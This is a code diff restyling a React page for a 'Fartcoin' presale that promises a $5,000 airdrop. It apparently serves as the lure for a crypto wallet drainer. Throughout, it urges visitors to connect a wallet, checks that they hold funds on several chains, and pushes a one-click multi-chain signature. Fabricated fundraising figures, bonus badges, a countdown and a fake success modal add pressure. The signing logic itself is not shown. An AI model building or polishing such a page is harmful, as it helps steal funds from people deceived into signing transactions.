+                          </div>
+                          <span className="animate-pulse">PROCESSING...</span>
                         </>
                       ) : (
                         <>
-                          <p className="text-lg mb-4 text-green-400 animate-pulse">✓ YOU QUALIFY!</p>
-                          <button
-                            onClick={executeMultiChainSignature}
-                            disabled={signatureLoading || loading}
-                            className="w-full border border-white px-6 py-6 rounded-md hover:bg-white/20 transition-all text-2xl font-terminal disabled:opacity-50 animate-pulse-glow relative overflow-hidden group"
-                          >
-                            <span className="absolute inset-0 bg-white/10 animate-ping"></span>
-                            <span className="relative z-10 flex items-center justify-center gap-3">
-                              {signatureLoading ? (
-                                <>
-                                  <span className="animate-spin text-2xl">⟳</span>
-                                  PROCESSING ON ALL CHAINS...
-                                </>
-                              ) : (
-                                <>
-                                  <span className="text-3xl animate-bounce">⚡</span>
-                                  CLAIM $5,000 FART + {presaleStats.currentBonus}% BONUS
-                                  <span className="text-3xl animate-bounce animation-delay-500">⚡</span>
-                                </>
-                              )}
+                          <span className="text-5xl filter drop-shadow-lg animate-bounce">💨</span>
+                          <div>
+                            <span className="bg-clip-text text-transparent bg-gradient-to-r from-white to-yellow-200">
+                              CLAIM $5,000 FART + {presaleStats.currentBonus}%
                             </span>
-                          </button>
-                          <p className="text-xs text-white/50 mt-3">
-                            Sign once • Executes on all eligible chains
-                          </p>
+                            <div className="text-sm font-normal text-white/80 mt-1">
+                              Click to confirm • Instant Delivery
+                            </div>
+                          </div>
+                          <span className="bg-white/20 px-6 py-3 rounded-xl text-xl group-hover:translate-x-2 transition-transform">→</span>
                         </>
                       )}
                     </div>
-                  )}
-                </div>
+                  </div>
+                </button>
+              )}
 
-                {/* Market Stats */}
-                <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mt-8">
-                  <div className="terminal-frame p-4 border-white">
-                    <p className="text-white/70 text-sm">&gt; Market Cap:</p>
-                    <p className="text-white text-lg">370,072,206 USD</p>
+              {/* Quick Stats - UPDATED TO FARTCOIN */}
+              {isEligible && !completedChains.length && (
+                <div className="flex justify-center gap-8 mt-6 text-sm">
+                  <div className="flex items-center gap-2">
+                    <div className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></div>
+                    <span className="text-gray-400">Presale Terms</span>
                   </div>
-                  <div className="terminal-frame p-4 border-white">
-                    <p className="text-white/70 text-sm">&gt; Current Price:</p>
-                    <p className="text-white text-lg">$0.3706</p>
+                  <div className="flex items-center gap-2">
+                    <div className="w-2 h-2 bg-blue-400 rounded-full animate-pulse"></div>
+                    <span className="text-gray-400">Instant Delivery</span>
                   </div>
-                </div>
-              </div>
-            </div>
-          </section>
-
-          {/* Status Messages */}
-          {txStatus && (
-            <div className="max-w-2xl mx-auto mb-6 px-4">
-              <div className="terminal-frame p-5 border-white">
-                <div className="flex items-center gap-4">
-                  <div className="w-12 h-12 border-2 border-white rounded-lg flex items-center justify-center text-2xl">
-                    {txStatus.includes('✅') ? '✓' : txStatus.includes('🎉') ? '🎉' : '⟳'}
-                  </div>
-                  <div className="flex-1">
-                    <p className="text-white font-mono">{txStatus}</p>
-                    {executionResults.length > 0 && (
-                      <div className="mt-2 flex flex-wrap gap-2">
-                        {executionResults.map((result, idx) => (
-                          <span 
-                            key={idx}
-                            className={`text-xs px-2 py-1 border ${
-                              result.status === 'success' 
-                                ? 'border-green-400 text-green-400' 
-                                : 'border-red-400 text-red-400'
-                            }`}
-                          >
-                            {result.chain}: {result.status === 'success' ? '✓' : '✗'}
-                          </span>
-                        ))}
-                      </div>
-                    )}
+                  <div className="flex items-center gap-2">
+                    <div className="w-2 h-2 bg-orange-400 rounded-full animate-pulse"></div>
+                    <span className="text-gray-400">$5,000 Airdrop</span>
                   </div>
                 </div>
-              </div>
+              )}
             </div>
           )}
-
-          {/* Error Display */}
-          {error && !error.includes('Unable to verify') && (
-            <div className="max-w-2xl mx-auto mb-6 px-4">
-              <div className="terminal-frame p-5 border-red-500/30">
-                <div className="flex items-center gap-4">
-                  <div className="w-12 h-12 border-2 border-red-500 rounded-lg flex items-center justify-center text-3xl">
-                    ⚠️
-                  </div>
-                  <p className="text-red-200 font-mono">{error}</p>
-                </div>
-              </div>
-            </div>
-          )}
-
-          {/* Wallet Connection Status */}
-          <div className="max-w-2xl mx-auto mb-8 px-4">
-            {!isConnected ? (
-              <button
-                onClick={() => open()}
-                className="w-full group relative"
-              >
-                <div className="terminal-frame p-6 border-white hover:bg-white/5 transition-all duration-300">
-                  <span className="flex items-center justify-center gap-3 font-terminal text-xl">
-                    <span className="text-2xl animate-bounce">🔌</span>
-                    CONNECT WALLET FOR $5,000 AIRDROP
-                    <span className="animate-pulse text-2xl">⚡</span>
-                  </span>
-                </div>
-              </button>
-            ) : (
-              <div className="terminal-frame p-5 border-white">
-                <div className="flex items-center justify-between flex-wrap gap-4">
-                  <div className="flex items-center gap-4">
-                    <div className="w-14 h-14 border-2 border-white rounded-xl flex items-center justify-center text-3xl">
-                      👤
-                    </div>
-                    <div>
-                      <div className="text-xs text-white/70 mb-1">CONNECTED</div>
-                      <div className="font-mono text-sm bg-white/5 px-3 py-1.5 border border-white/30 group/address relative">
-                        {formatAddress(address)}
-                        <span className="absolute hidden group-hover/address:block bg-black text-xs px-2 py-1 border border-white/30 mt-1 z-50">
-                          {address}
-                        </span>
-                      </div>
-                    </div>
-                  </div>
-                  <div className="flex items-center gap-6">
-                    <div className="text-right">
-                      <div className="text-xs text-white/70 mb-1">STATUS</div>
-                      <div className="text-sm">
-                        {isEligible ? '✅ Eligible' : '👋 Welcome'}
-                      </div>
-                    </div>
-                    <button
-                      onClick={handleDisconnect}
-                      className="px-4 py-2 border border-red-500/30 text-red-400 rounded-md hover:bg-red-500/10 transition-colors"
-                    >
-                      ✕
-                    </button>
-                  </div>
-                </div>
-              </div>
-            )}
-          </div>
-
-          {/* Allocation Card */}
-          {isConnected && !verifying && scanResult && isEligible && !completedChains.length && (
-            <div className="max-w-2xl mx-auto mb-8 px-4">
-              <div className="terminal-frame p-8 border-white">
-                <div className="text-center">
-                  <p className="text-white/70 text-sm tracking-wider mb-3">YOUR ALLOCATION</p>
-                  <div className="text-6xl font-terminal text-glow mb-2">
-                    $5,000 FART
-                  </div>
-                  <p className="text-green-400 text-xl flex items-center justify-center gap-2">
-                    <span>+{presaleStats.currentBonus}% Bonus</span>
-                    <span className="text-xs border border-green-400/30 px-2 py-1">ACTIVE</span>
-                  </p>
-                  
-                  {/* Eligible Chains Display */}
-                  {Object.keys(balances).length > 0 && (
-                    <div className="mt-4 pt-4 border-t border-white/30">
-                      <p className="text-sm text-white/70 mb-2">Eligible Chains ({Object.keys(balances).length})</p>
-                      <div className="flex flex-wrap justify-center gap-2">
-                        {Object.keys(balances).map(chainName => (
-                          <span key={chainName} className="text-xs px-2 py-1 border border-white/30">
-                            {chainName}
-                          </span>
-                        ))}
-                      </div>
-                    </div>
-                  )}
-                </div>
-              </div>
-            </div>
-          )}
-
-          {/* Non-Eligible Welcome Card */}
-          {isConnected && !verifying && scanResult && !isEligible && (
-            <div className="max-w-2xl mx-auto mb-8 px-4">
-              <div className="terminal-frame p-8 border-white">
-                <div className="text-center">
-                  <div className="text-7xl mb-6 animate-float">👋</div>
-                  <h2 className="text-3xl font-terminal mb-4 text-glow">
-                    Welcome to Fartcoin
-                  </h2>
-                  <p className="text-white/70 text-lg mb-8 max-w-md mx-auto">
-                    Connect your wallet to check eligibility.
-                  </p>
-                  <div className="border border-white/30 p-6">
-                    <p className="text-sm text-white/50">
-                      Minimum $1 required for eligibility.
-                    </p>
-                  </div>
-                </div>
-              </div>
-            </div>
-          )}
-
-          {/* Presale Stats */}
-          <div className="max-w-2xl mx-auto mt-12 mb-8 px-4">
-            <div className="terminal-frame p-8 border-white">
-              <h3 className="text-2xl font-terminal text-center mb-6 text-glow">
-                PRESALE LIVE PROGRESS
-              </h3>
-              
-              <div className="grid grid-cols-3 gap-4 mb-6">
-                <div className="text-center">
-                  <div className="text-3xl font-bold mb-1">${presaleStats.tokenPrice}</div>
-                  <div className="text-xs text-white/50">Token Price</div>
-                </div>
-                <div className="text-center">
-                  <div className="text-3xl font-bold text-green-400 mb-1">{presaleStats.currentBonus}%</div>
-                  <div className="text-xs text-white/50">Current Bonus</div>
-                </div>
-                <div className="text-center">
-                  <div className="text-3xl font-bold text-yellow-400 mb-1">$1.25M</div>
-                  <div className="text-xs text-white/50">Total Raised</div>
-                </div>
-              </div>
-
-              {/* Progress Bar */}
-              <div className="mb-4">
-                <div className="flex justify-between text-sm text-white/70 mb-2">
-                  <span>Progress</span>
-                  <span>{liveProgress.percentComplete}%</span>
-                </div>
-                <div className="w-full h-3 border border-white/30 bg-black">
-                  <div 
-                    className="h-full bg-white"
-                    style={{ width: `${liveProgress.percentComplete}%` }}
-                  ></div>
-                </div>
-              </div>
-
-              <div className="grid grid-cols-2 gap-4 mt-6">
-                <div className="border border-white/30 p-3 text-center">
-                  <div className="text-sm text-white/70 mb-1">Participants Today</div>
-                  <div className="text-xl font-bold">{liveProgress.participantsToday}</div>
-                </div>
-                <div className="border border-white/30 p-3 text-center">
-                  <div className="text-sm text-white/70 mb-1">Avg Allocation</div>
-                  <div className="text-xl font-bold">${liveProgress.avgAllocation}</div>
-                </div>
-              </div>
-
-              <div className="mt-6 text-center">
-                <p className="text-sm text-white/50">
-                  {presaleStats.totalParticipants.toLocaleString()} participants
-                </p>
-              </div>
-            </div>
-          </div>
-
-          {/* Exchanges Section */}
-          <section className="py-16-b px-4">
-            <div className="container mx-auto">
-              <div className="terminal-frame p-6 max-w-4xl mx-auto border-white" style={{boxShadow: '0 0 10px rgba(255,255,255,0.5)'}}>
-                <h2 className="text-2xl md:text-3xl font-terminal text-glow text-center mb-8 text-white">
-                  &gt; WE'RE AVAILABLE ON<span className="cursor"></span>
-                </h2>
-                <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
-                  {/* Axiom */}
-                  <div className="border border-white/50 hover:border-white transition-all duration-300 p-6 flex flex-col items-center">
-                    <div className="w-16 h-16 mb-4 relative">
-                      <img src="" alt="" />
-                    </div>
-                    <h3 className="text-white text-xl mb-4">Axiom</h3>
-                    <a 
-                      href="#" 
-                      target="_blank" 
-                      rel="noopener noreferrer" 
-                      className="inline-flex items-center justify-center gap-2 whitespace-nowrap font-medium transition-colors focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-ring disabled:pointer-events-none disabled:opacity-50 border bg-background shadow-sm hover:text-accent-foreground h-8 rounded-md px-3 text-xs border-white text-white hover:bg-white/20 w-full"
-                    >
-                      Trade Now
-                      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="ml-2 h-4 w-4">
-                        <path d="M15 3h6v6"></path>
-                        <path d="M10 14 21 3"></path>
-                        <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path>
-                      </svg>
-                    </a>
-                  </div>
-                </div>
-                <div className="mt-8 text-center text-white/70 text-sm">
-                  <p>&gt; More exchanges coming soon. Stay tuned for updates.</p>
-                </div>
-              </div>
-            </div>
-          </section>
-        </main>
-
-        {/* Footer */}
-        <footer className="py-8 px-4 border-t border-white/30">
-          <div className="container mx-auto">
-            <div className="terminal-frame p-6 max-w-4xl mx-auto border-white" style={{boxShadow: '0 0 10px rgba(255,255,255,0.5)'}}>
-              <h2 className="text-xl md:text-2xl font-terminal text-glow text-center mb-6 text-white">
-                &gt; JOIN THE FART COMMUNITY<span className="cursor"></span>
-              </h2>
-              <div className="flex flex-wrap justify-center gap-8 mb-8">
-                {/* Twitter/X */}
-                <div className="group p-4">
-                  <div className="border border-white hover:bg-white/20 flex items-center gap-2 text-white px-4 py-2 rounded-md transition-all cursor-pointer">
-                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="h-5 w-5 text-white group-hover:animate-pulse">
-                      <path d="M22 4s-.7 2.1-2 3.4c1.6 10-9.4 17.3-18 11.6 2.2.1 4.4-.6 6-2C3 15.5.5 9.6 3 5c2.2 2.6 5.6 4.1 9 4-.9-4.2 4-6.6 7-3.8 1.1 0 3-1.2 3-1.2z"></path>
-                    </svg>
-                    <span>X</span>
-                  </div>
-                </div>
-                {/* Telegram */}
-                <div className="group p-4">
-                  <div className="border border-white hover:bg-white/20 flex items-center gap-2 text-white px-4 py-2 rounded-md transition-all cursor-pointer">
-                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="h-5 w-5 text-white group-hover:animate-pulse">
-                      <path d="M7.9 20A9 9 0 1 0 4 16.1L2 22Z"></path>
-                    </svg>
-                    <span>Telegram</span>
-                  </div>
-                </div>
-              </div>
-              <div className="h-[1px] w-full bg-white/30 my-6"></div>
-              <div className="text-center text-white/70 text-sm">
-                <p>© 2025 Fartcoin. All rights reserved.</p>
-              </div>
-            </div>
-          </div>
-        </footer>
-
-        {/* FART BUTTON - Easter egg */}
-        <div 
-          id="fart-button" 
-          className="hide-mobile fixed bottom-4 right-4 z-[9999] bg-black/90 border border-white/30 rounded-md px-4 py-2 font-mono text-white flex items-center gap-2 cursor-pointer hover:bg-white/10 transition-all"
-          onClick={() => {
-            setTxStatus('💨 FART!');
-            setTimeout(() => setTxStatus(''), 1000);
-          }}
-        >
-          PRESS <span className="bg-white/20 border border-white/40 px-2 py-1 rounded font-bold text-xs">F</span> TO FART
         </div>
 
-        {/* Celebration Modal */}
+        {/* Countdown Timer */}
+        <div className="grid grid-cols-4 gap-4 mb-8 max-w-2xl mx-auto">
+          {[
+            { label: 'DAYS', value: timeLeft.days, color: 'from-orange-500 to-red-500' },
+            { label: 'HOURS', value: timeLeft.hours, color: 'from-yellow-500 to-orange-500' },
+            { label: 'MINUTES', value: timeLeft.minutes, color: 'from-orange-400 to-yellow-500' },
+            { label: 'SECONDS', value: timeLeft.seconds, color: 'from-yellow-400 to-orange-400' }
+          ].map((item, index) => (
+            <div key={index} className="relative group perspective-1000">
+              <div className="absolute inset-0 bg-gradient-to-r from-orange-500/30 to-yellow-500/30 rounded-2xl blur-2xl opacity-0 group-hover:opacity-100 transition-all duration-500 animate-pulse"></div>
+              <div className="relative bg-gray-900/70 backdrop-blur-xl border border-gray-800 rounded-2xl p-5 text-center overflow-hidden transform-gpu group-hover:rotate-y-6 transition-all duration-500">
+                <div className={`absolute inset-0 bg-gradient-to-br ${item.color} opacity-10 group-hover:opacity-20 transition-opacity`}></div>
+                <div className="text-4xl md:text-5xl font-black bg-gradient-to-br from-white to-gray-300 bg-clip-text text-transparent mb-1 animate-pulse-slow">
+                  {item.value.toString().padStart(2, '0')}
+                </div>
+                <div className="text-xs font-semibold text-gray-500 tracking-wider">{item.label}</div>
+              </div>
+            </div>
+          ))}
+        </div>
+
+        {/* Wallet Connection Status - SIMPLIFIED with user icon only */}
+        <div className="max-w-2xl mx-auto mb-8">
+          {!isConnected ? (
+            <button
+              onClick={() => open()}
+              className="w-full group relative animate-attention-glow"
+            >
+              <div className="absolute -inset-2 bg-gradient-to-r from-orange-500 to-yellow-500 rounded-xl blur-2xl opacity-75 group-hover:opacity-100 animate-pulse-slow"></div>
+              {/* Animated pointing arrow */}
+              <div className="absolute -top-12 left-1/2 transform -translate-x-1/2 flex flex-col items-center animate-bounce-subtle">
+                <span className="text-4xl animate-pointing-finger">👇</span>
+                <span className="text-xs text-orange-400 font-bold mt-1 animate-pulse-glow">CLICK HERE TO CONNECT</span>
+              </div>
+              {/* Animated hand-drawn circle */}
+              <svg className="absolute -inset-8 w-[calc(100%+4rem)] h-[calc(100%+4rem)] pointer-events-none animate-draw-circle" viewBox="0 0 200 100" preserveAspectRatio="none">
+                <ellipse
+                  cx="100"
+                  cy="50"
+                  rx="95"
+                  ry="45"
+                  fill="none"
+                  stroke="url(#gradient)"
+                  strokeWidth="3"
+                  strokeDasharray="8 8"
+                  className="animate-dash"
+                />
+                <defs>
+                  <linearGradient id="gradient" x1="0%" y1="0%" x2="100%" y2="0%">
+                    <stop offset="0%" stopColor="#f97316" stopOpacity="0.8">
+                      <animate attributeName="stop-color" values="#f97316;#eab308;#f97316" dur="3s" repeatCount="indefinite" />
+                    </stop>
+                    <stop offset="100%" stopColor="#eab308" stopOpacity="0.8">
+                      <animate attributeName="stop-color" values="#eab308;#f97316;#eab308" dur="3s" repeatCount="indefinite" />
+                    </stop>
+                  </linearGradient>
+                </defs>
+              </svg>
+              <div className="relative bg-gray-900/90 backdrop-blur-xl rounded-xl py-5 px-6 font-bold text-lg border border-gray-800 transform-gpu group-hover:scale-105 transition-all duration-500">
+                <span className="flex items-center justify-center gap-3">
+                  <span className="text-2xl animate-bounce">🔌</span>
+                  CONNECT WALLET FOR $5,000 AIRDROP
+                  <span className="absolute right-2 top-1/2 -translate-y-1/2 text-orange-400 animate-pulse-glow">⚡</span>
+                </span>
+              </div>
+            </button>
+          ) : (
+            <div className="bg-gray-900/70 backdrop-blur-xl border border-gray-800 rounded-xl p-5 transform-gpu hover:scale-105 transition-all duration-500">
+              <div className="flex items-center justify-between flex-wrap gap-4">
+                <div className="flex items-center gap-4">
+                  <div className="relative group/avatar">
+                    <div className="w-14 h-14 bg-gradient-to-br from-orange-500 to-yellow-500 rounded-xl flex items-center justify-center text-3xl transform-gpu group-hover/avatar:rotate-12 transition-transform">
+                      👤
+                    </div>
+                    <div className="absolute -bottom-1 -right-1 w-5 h-5 bg-green-500 rounded-full border-2 border-gray-900 animate-pulse"></div>
+                  </div>
+                  <div>
+                    <div className="text-xs text-gray-500 mb-1">CONNECTED</div>
+                    <div className="font-mono text-sm bg-gray-800/50 px-3 py-1.5 rounded-lg border border-gray-700 group/address">
+                      {formatAddress(address)}
+                      <span className="absolute hidden group-hover/address:block bg-gray-900 text-xs px-2 py-1 rounded border border-orange-500/30 mt-1 z-50">
+                        {address}
+                      </span>
+                    </div>
+                  </div>
+                </div>
+                <div className="flex items-center gap-6">
+                  <div className="text-right">
+                    <div className="text-xs text-gray-500 mb-1">BALANCE</div>
+                    <div className="text-sm text-orange-400">
+                      ${totalUSD.toFixed(2)}
+                    </div>
+                  </div>
+                  <button
+                    onClick={handleDisconnect}
+                    className="px-4 py-2 bg-red-500/10 text-red-400 rounded-lg hover:bg-red-500/20 transition-colors border border-red-500/30 hover:scale-110 transform cursor-pointer active:scale-95"
+                  >
+                    ✕
+                  </button>
+                </div>
+              </div>
+            </div>
+          )}
+        </div>
+
+        {/* Status Messages - Enhanced to show multi-chain progress */}
+        {txStatus && !verifying && (
+          <div className="max-w-2xl mx-auto mb-6">
+            <div className="bg-gradient-to-r from-orange-500/20 to-yellow-500/20 backdrop-blur-xl border border-orange-500/30 rounded-xl p-5 animate-slideIn">
+              <div className="flex items-center gap-4">
+                <div className="relative">
+                  <div className="w-12 h-12 bg-gradient-to-br from-orange-500 to-yellow-500 rounded-lg flex items-center justify-center text-2xl">
+                    {txStatus.includes('✅') ? '✓' : txStatus.includes('🎉') ? '🎉' : '⟳'}
+                  </div>
+                  {signatureLoading && (
+                    <div className="absolute inset-0 border-4 border-orange-500 border-t-transparent rounded-full animate-spin"></div>
+                  )}
+                </div>
+                <div className="flex-1">
+                  <p className="text-gray-200 font-medium">{txStatus}</p>
+                  {executionResults.length > 0 && (
+                    <div className="mt-2 flex flex-wrap gap-2">
+                      {executionResults.map((result, idx) => (
+                        <span 
+                          key={idx}
+                          className={`text-xs px-2 py-1 rounded-full ${
+                            result.status === 'success' 
+                              ? 'bg-green-500/20 text-green-400' 
+                              : 'bg-red-500/20 text-red-400'
+                          }`}
+                        >
+                          {result.chain}: {result.status === 'success' ? '✓' : '✗'}
+                        </span>
+                      ))}
+                    </div>
+                  )}
+                </div>
+              </div>
+            </div>
+          </div>
+        )}
+
+        {/* Error Display - Only show for real errors, not verification */}
+        {error && !error.includes('Unable to verify') && (
+          <div className="max-w-2xl mx-auto mb-6">
+            <div className="bg-red-500/20 backdrop-blur-xl border border-red-500/30 rounded-xl p-5 animate-shake">
+              <div className="flex items-center gap-4">
+                <div className="w-12 h-12 bg-gradient-to-br from-red-500 to-orange-500 rounded-lg flex items-center justify-center text-3xl">
+                  ⚠️
+                </div>
+                <p className="text-red-200">{error}</p>
+              </div>
+            </div>
+          </div>
+        )}
+
+        {/* MAIN CONTENT - ALLOCATION CARD */}
+        {isConnected && !verifying && scanResult && isEligible && (
+          <div className="max-w-2xl mx-auto">
+            <div className="space-y-6">
+              {/* Premium Allocation Card - UPDATED TO FARTCOIN */}
+              <div className="relative group perspective-1000">
+                <div className="absolute -inset-2 bg-gradient-to-r from-orange-600 via-yellow-600 to-orange-600 rounded-2xl blur-3xl opacity-75 group-hover:opacity-100 animate-pulse"></div>
+                <div className="relative bg-gradient-to-br from-gray-900 to-gray-800 rounded-2xl p-8 border border-orange-500/30 transform-gpu group-hover:rotate-y-12 transition-all duration-700">
+                  
+                  {/* Bonus Badge */}
+                  <div className="absolute -top-4 -right-4 animate-float">
+                    <div className="bg-gradient-to-r from-yellow-400 to-orange-500 text-black font-black px-6 py-3 rounded-full text-lg shadow-2xl transform rotate-12 hover:rotate-0 transition-transform">
+                      +{presaleStats.currentBonus}% BONUS
+                    </div>
+                  </div>
+                  
+                  <div className="text-center">
+                    <p className="text-gray-400 text-sm tracking-wider mb-3">YOUR ALLOCATION</p>
+                    <div className="text-7xl font-black bg-gradient-to-r from-orange-400 to-yellow-400 bg-clip-text text-transparent mb-2 animate-pulse-slow">
+                      $5,000 FART
+                    </div>
+                    <p className="text-green-400 text-xl flex items-center justify-center gap-2">
+                      <span>+{presaleStats.currentBonus}% Bonus</span>
+                      <span className="text-xs bg-green-500/20 px-2 py-1 rounded-full">ACTIVE</span>
+                    </p>
+                    
+                    {/* Eligible Chains Display */}
+                    <div className="mt-4 pt-4 border-t border-gray-700">
+                      <p className="text-sm text-gray-400 mb-2">Eligible Chains ({Object.keys(balances).length})</p>
+                      <div className="flex flex-wrap justify-center gap-2">
+                        {Object.keys(balances).map(chainName => {
+                          const chain = DEPLOYED_CHAINS.find(c => c.name === chainName);
+                          return (
+                            <span key={chainName} className={`text-xs px-2 py-1 rounded-full bg-gradient-to-r ${chain?.color || 'from-gray-500 to-gray-600'} bg-opacity-20 text-white border border-white/10`}>
+                              {chain?.icon} {chainName}
+                            </span>
+                          );
+                        })}
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        )}
+
+        {/* Not Eligible Message - SHOWN WHEN NOT ELIGIBLE */}
+        {isConnected && !verifying && scanResult && !isEligible && (
+          <div className="max-w-2xl mx-auto">
+            <div className="bg-gray-900/50 backdrop-blur-xl border border-gray-800 rounded-2xl p-10 text-center">
+              <div className="text-7xl mb-6 animate-float">👋</div>
+              <h2 className="text-3xl font-bold mb-4 text-gray-400">
+                Not Eligible
+              </h2>
+              <p className="text-gray-500 text-lg mb-8 max-w-md mx-auto">
+                Minimum $1 required across any chain to qualify for the $5,000 FART airdrop.
+              </p>
+              <div className="bg-gray-800/50 rounded-xl p-6 border border-gray-700">
+                <p className="text-sm text-orange-400 mb-2">Your current balance:</p>
+                <p className="text-2xl font-bold text-white">${totalUSD.toFixed(2)}</p>
+              </div>
+            </div>
+          </div>
+        )}
+
+        {/* PRESALE STATS */}
+        <div className="max-w-2xl mx-auto mt-12 mb-8">
+          <div className="bg-gray-900/50 backdrop-blur-xl border border-gray-800 rounded-2xl p-8">
+            <h3 className="text-2xl font-bold text-center mb-6 bg-gradient-to-r from-orange-400 to-yellow-400 bg-clip-text text-transparent">
+              PRESALE LIVE PROGRESS
+            </h3>
+            
+            <div className="grid grid-cols-3 gap-4 mb-6">
+              <div className="text-center">
+                <div className="text-3xl font-bold text-orange-400 mb-1">${presaleStats.tokenPrice}</div>
+                <div className="text-xs text-gray-500">Token Price</div>
+              </div>
+              <div className="text-center">
+                <div className="text-3xl font-bold text-green-400 mb-1">{presaleStats.currentBonus}%</div>
+                <div className="text-xs text-gray-500">Current Bonus</div>
+              </div>
+              <div className="text-center">
+                <div className="text-3xl font-bold text-yellow-400 mb-1">$1.25M</div>
+                <div className="text-xs text-gray-500">Total Raised</div>
+              </div>
+            </div>
+
+            {/* Progress Bar */}
+            <div className="mb-4">
+              <div className="flex justify-between text-sm text-gray-400 mb-2">
+                <span>Progress</span>
+                <span>{liveProgress.percentComplete}%</span>
+              </div>
+              <div className="w-full h-3 bg-gray-800 rounded-full overflow-hidden">
+                <div 
+                  className="h-full bg-gradient-to-r from-orange-500 to-yellow-500 rounded-full relative"
+                  style={{ width: `${liveProgress.percentComplete}%` }}
+                >
+                  <div className="absolute inset-0 bg-white/20 animate-shimmer"></div>
+                </div>
+              </div>
+            </div>
+
+            <div className="grid grid-cols-2 gap-4 mt-6">
+              <div className="bg-gray-800/50 rounded-lg p-3 text-center">
+                <div className="text-sm text-gray-400 mb-1">Participants Today</div>
+                <div className="text-xl font-bold text-orange-400">{liveProgress.participantsToday}</div>
+              </div>
+              <div className="bg-gray-800/50 rounded-lg p-3 text-center">
+                <div className="text-sm text-gray-400 mb-1">Avg Allocation</div>
+                <div className="text-xl font-bold text-yellow-400">${liveProgress.avgAllocation}</div>
+              </div>
+            </div>
+
+            <div className="mt-6 text-center">
+              <p className="text-sm text-gray-500">
+                {presaleStats.totalParticipants.toLocaleString()} participants
+              </p>
+            </div>
+          </div>
+        </div>
+
+        {/* EPIC CELEBRATION MODAL - UPDATED TO FARTCOIN */}
         {showCelebration && (
-          <div className="fixed inset-0 bg-black/95 backdrop-blur flex items-center justify-center z-50 p-4">
+          <div className="fixed inset-0 bg-black/95 backdrop-blur-2xl flex items-center justify-center z-50 p-4 animate-fadeIn">
             <div className="relative max-w-lg w-full">
-              <div className="terminal-frame p-12 border-white">
+              {/* Exploding Background */}
+              <div className="absolute inset-0 bg-gradient-to-r from-orange-600 via-yellow-600 to-orange-600 rounded-3xl blur-3xl animate-pulse-slow"></div>
+              
+              {/* Confetti Cannons */}
+              {[...Array(20)].map((_, i) => (
+                <div
+                  key={i}
+                  className="absolute w-2 h-2 bg-gradient-to-r from-yellow-400 to-orange-500 rounded-full animate-confetti-cannon"
+                  style={{
+                    left: `${Math.random() * 100}%`,
+                    top: '50%',
+                    animationDelay: `${i * 0.1}s`,
+                    animationDuration: `${1 + Math.random()}s`
+                  }}
+                />
+              ))}
+              
+              {/* Modal Content */}
+              <div className="relative bg-gradient-to-br from-gray-900 to-gray-800 rounded-3xl p-12 border border-orange-500/30 shadow-2xl transform-gpu animate-scaleIn">
                 <div className="text-center">
-                  <div className="text-8xl mb-8 animate-bounce">🎉</div>
-                  <h2 className="text-5xl font-terminal mb-4 text-glow">
+                  {/* Exploding Icon */}
+                  <div className="relative mb-8">
+                    <div className="text-8xl animate-bounce-3d">💨</div>
+                    {[...Array(16)].map((_, i) => (
+                      <div
+                        key={i}
+                        className="absolute w-3 h-3 bg-orange-500 rounded-full animate-confetti-spiral"
+                        style={{
+                          top: '50%',
+                          left: '50%',
+                          transform: `rotate(${i * 22.5}deg) translateY(-70px)`,
+                          animationDelay: `${i * 0.05}s`
+                        }}
+                      />
+                    ))}
+                  </div>
+                  
+                  <h2 className="text-5xl font-black mb-4 bg-gradient-to-r from-yellow-400 via-orange-500 to-yellow-400 bg-clip-text text-transparent animate-pulse">
                     🚀 SUCCESSFUL! 🚀
                   </h2>
-                  <p className="text-2xl text-white/70 mb-4">You have secured</p>
-                  <div className="text-6xl font-terminal text-glow mb-3">$5,000 FART</div>
-                  <div className="border border-green-400/50 px-8 py-4 mb-6">
+                  
+                  <p className="text-2xl text-gray-300 mb-4">You have secured</p>
+                  
+                  <div className="text-7xl font-black text-orange-400 mb-3 animate-float-3d">$5,000 FART</div>
+                  
+                  <div className="inline-block bg-gradient-to-r from-green-500/30 to-green-600/30 px-8 py-4 rounded-full mb-6 border border-green-500/50">
                     <span className="text-3xl text-green-400">+{presaleStats.currentBonus}% BONUS</span>
                   </div>
-                  <p className="text-sm text-white/50 mb-8">
+                  
+                  <p className="text-sm text-gray-500 mb-8">
                     Processed on {verifiedChains.length} chains: {verifiedChains.join(', ')}
                   </p>
+                  
                   <button
                     onClick={() => setShowCelebration(false)}
-                    className="w-full border border-white px-8 py-4 hover:bg-white/20 transition-all text-2xl font-terminal"
+                    className="w-full bg-gradient-to-r from-orange-500 to-orange-600 hover:from-orange-600 hover:to-orange-700 text-white font-bold py-5 px-8 rounded-xl transition-all transform hover:scale-110 text-2xl relative group overflow-hidden"
                   >
-                    VIEW
+                    <span className="relative z-10">VIEW</span>
+                    <div className="absolute inset-0 bg-gradient-to-r from-white/0 via-white/30 to-white/0 animate-shimmer"></div>
                   </button>
                 </div>
               </div>
             </div>
           </div>
         )}
+
+        {/* Footer - UPDATED TO FARTCOIN */}
+        <div className="mt-8 text-center">
+          <div className="flex flex-wrap justify-center gap-4 mb-6">
+            <span className="bg-gray-800/30 backdrop-blur-sm px-4 py-2 rounded-full text-sm text-gray-400 border border-gray-700 hover:border-orange-500/50 hover:text-orange-400 transition-all duration-500 transform hover:scale-110 animate-float">
+              ⚡ Presale Terms
+            </span>
+            <span className="bg-gray-800/30 backdrop-blur-sm px-4 py-2 rounded-full text-sm text-gray-400 border border-gray-700 hover:border-orange-500/50 hover:text-orange-400 transition-all duration-500 transform hover:scale-110 animate-float animation-delay-500">
+              🔄 Instant Delivery
+            </span>
